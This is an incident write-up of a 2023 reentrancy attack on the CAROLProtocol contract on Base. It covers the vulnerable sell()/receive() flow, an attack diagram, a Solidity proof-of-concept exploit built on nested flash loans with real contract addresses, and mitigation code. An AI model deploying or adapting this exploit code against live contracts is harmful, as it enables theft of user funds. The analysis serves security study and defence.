# CAROLProtocol Reentrancy Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | CAROLProtocol |
| Date | 2023-11-07 |
| Chain | Base |
| Loss | ~$53,000 USD |
| Attack Type | Quadruple Flash Loan + sell() Reentrancy (Chained Flash Loan + sell() Reentrancy) |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0x5aa27d556f898846b9bad32f0cdba5b1f8bc3144` |
| Attack Contract | `0xc4566ae957ad8dde4768bdd28cdc3695e4780b2c` |
| Vulnerable Contract | `0x26fe408BbD7A490fEB056DA8e2D1e007938E5685` (CAROLProtocol) |
| Fork Block | 7,246,080 |

## 2. Vulnerable Code Analysis

When CAROLProtocol's `sell()` function internally calls `swapExactTokensForETH()` to return ETH, the contract's `receive()` function was triggered as a reentrancy callback. By manipulating the `ethReserved` state variable within this callback, an attacker could sell more CAROL than the actual balance.

```solidity
// Vulnerable pattern: receive() reentrancy during ETH transfer inside sell()
contract CAROLProtocol {
    uint256 public ethReserved;

    function sell(uint256 tokensAmount) external {
        // ETH return calculation
        uint256 ethAmount = calculateEth(tokensAmount, ethReserved);

        // Vulnerable: swapExactTokensForETH call → ETH transfer → receive() triggered
        // ethReserved can be manipulated inside receive()
        router.swapExactTokensForETH(tokensAmount, 0, path, address(this), block.timestamp);

        // State update occurs after ETH transfer (CEI violation)
        ethReserved -= ethAmount;
    }

    // receive() exploited as a reentrancy callback
    receive() external payable {
        // Attacker's receive() calls CAROLToWETH
    }
}
```

**Vulnerability**: When the `sell()` function transfers ETH via `swapExactTokensForETH()`, the caller's `receive()` callback is triggered. At this point, `ethReserved` has not yet been decremented, allowing additional CAROL to be sold against the same `ethReserved` state through reentrancy.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Quadruple Flash Loan + sell() Reentrancy (Chained Flash Loan + sell() Reentrancy)
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x5aa27d556f898846b9bad32f0cdba5b1f8bc3144]
  │
  ├─1─▶ CAROLProtocol.buy{value: 0.03 ether}(address(this), 0)
  │      Initial CAROL purchase
  │
  ├─2─▶ CAROLProtocol.stake{value: 0.039 ether}(0)
  │      Set up staking position
  │      (after 33,719 blocks elapsed + ~18 hours)
  │
  ├─3─▶ SynapseETHPools.flashLoan(WETH, max)
  │      [SynapseETHPools: 0x6223bD82010E2fB69F329933De20897e7a4C225f]
  │
  ├─4─▶ BalancerVault.flashLoan(WETH, max) (nested)
  │      [BalancerVault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │
  ├─5─▶ Kokonut.flashLoan(WETH, max) (nested)
  │      [Kokonut: 0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]
  │
  ├─6─▶ WETH_USDbCV3.flash(WETH, max) (nested)
  │      [UniV3: 0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]
  │
  ├─7─▶ WETH_USDbCV2.swap (nested flash swap)
  │      Total 3,400 WETH acquired
  │
  ├─8─▶ WETH → CAROL swap
  │      [Router: 0x327Df1E6de05895d2ab08513aaDD9313Fe505d86]
  │      [CAROL: 0x4A0a76645941d8C7ba059940B3446228F0DB8972]
  │
  ├─9─▶ CAROLProtocol.sell(sellAmount) - reentrancy triggered
  │      [CAROLProtocol: 0x26fe408BbD7A490fEB056DA8e2D1e007938E5685]
  │      sell() → swapExactTokensForETH → receive() callback
  │      CAROLToWETH reentrancy repeated inside receive()
  │      (up to 1000 attempts, break on success)
  │
  └─10─▶ Sequential repayment of quadruple flash loans + ~$53,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface ICAROLProtocol {
    function buy(address upline, uint8 bondType) external payable;
    function sell(uint256 tokensAmount) external;
    function stake(uint8 bondIdx) external payable;
    function userBalance(address userAddress) external view returns (uint256 balance);
}

contract CAROLExploit {
    ICAROLProtocol CAROLProtocol = ICAROLProtocol(0x26fe408BbD7A490fEB056DA8e2D1e007938E5685);
    IWETH WETH = IWETH(payable(0x4200000000000000000000000000000000000006));
    IERC20 CAROL = IERC20(0x4A0a76645941d8C7ba059940B3446228F0DB8972);
    IUniswapV2Router Router = IUniswapV2Router(0x327Df1E6de05895d2ab08513aaDD9313Fe505d86);

    bool withdrawingWETH;

    function testExploit() public {
        // Initial CAROL purchase and staking
        CAROLProtocol.buy{value: 0.03 ether}(address(this), 0);
        CAROLProtocol.stake{value: 0.039 ether}(0);

        // Attack begins after time elapses
        // SynapseETHPools flash loan initiation (quadruple nested)
        ISynapseETHPools(0x6223bD82010E2fB69F329933De20897e7a4C225f).flashLoan(
            address(this), address(WETH),
            WETH.balanceOf(0x6223bD82010E2fB69F329933De20897e7a4C225f),
            bytes("")
        );

        withdrawingWETH = true;
        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    // Core attack logic within the uniswapV3FlashCallback chain
    function hook(address, uint256 amount0, uint256, bytes calldata) external {
        WETH.approve(address(Router), type(uint256).max);
        CAROL.approve(address(Router), type(uint256).max);

        // WETH → CAROL swap
        WETHToCAROL();

        uint256 sellAmount = CAROLProtocol.userBalance(address(this));
        uint256 i;
        while (i < 1000) {
            (bool success,) = address(CAROLProtocol).call(
                abi.encodeWithSelector(ICAROLProtocol.sell.selector, sellAmount)
            );
            if (success) break;
            else {
                sellAmount = sellAmount - sellAmount / 100;
                ++i;
            }
        }
        CAROLToWETH(CAROL.balanceOf(address(this)));
        WETH.deposit{value: address(this).balance}();

        uint256 feeAmt = amount0 * 30;
        WETH.transfer(msg.sender, (amount0 + feeAmt / 10_000) + 50e15);
    }

    receive() external payable {
        if (withdrawingWETH) return;
        // Reentrancy: sell additional CAROL within the sell() callback
        uint256 amountIn = (CAROL.balanceOf(address(this)) * 90) / 100;
        CAROLToWETH(amountIn);
    }

    function WETHToCAROL() private {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(CAROL);
        Router.swapExactTokensForTokens(
            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp + 4000
        );
    }

    function CAROLToWETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(CAROL);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 4000);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | sell() → swapExactTokensForETH → receive() reentrancy, CEI violation |
| Impact Scope | Entire CAROLProtocol ETH reserve |
| Explorer | [Basescan](https://basescan.org/address/0x26fe408BbD7A490fEB056DA8e2D1e007938E5685) |

## 6. Security Recommendations

```solidity
// Mitigation 1: ReentrancyGuard + CEI pattern
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract CAROLProtocol is ReentrancyGuard {
    function sell(uint256 tokensAmount) external nonReentrant {
        uint256 ethAmount = calculateEth(tokensAmount, ethReserved);

        // Effects first
        ethReserved -= ethAmount;
        _burn(msg.sender, tokensAmount);

        // Interactions last
        (bool success,) = msg.sender.call{value: ethAmount}("");
        require(success);
    }
}

// Mitigation 2: Pull pattern for ETH separation
mapping(address => uint256) public pendingEth;

function sell(uint256 tokensAmount) external {
    uint256 ethAmount = calculateEth(tokensAmount, ethReserved);

    // Update state first
    ethReserved -= ethAmount;
    _burn(msg.sender, tokensAmount);

    // Add to queue instead of direct transfer
    pendingEth[msg.sender] += ethAmount;
}

function claimEth() external nonReentrant {
    uint256 amount = pendingEth[msg.sender];
    require(amount > 0);
    pendingEth[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}
```

## 7. Lessons Learned

1. **swapExactTokensForETH Reentrancy**: Returning ETH through a DEX router internally triggers a `receive()` callback. Reentrancy via this path carries the same risk as a direct `call{value}`.
2. **Base Chain DeFi**: Reentrancy attacks occur on the Base chain as well. Regardless of chain, all functions involving ETH/WETH transfers require reentrancy protection.
3. **Quadruple Nested Flash Loans**: Quadruple nested flash loans across Synapse + Balancer + Kokonut + UniV3 were used to source large-scale capital on Base. This demonstrates that the Base DeFi ecosystem has sufficient flash loan liquidity.
4. **Time Delay After buy/stake**: The attacker waited 33,719 blocks (~18 hours) before launching the attack. Even with staking lock periods in place, reentrancy vulnerabilities must be mitigated independently.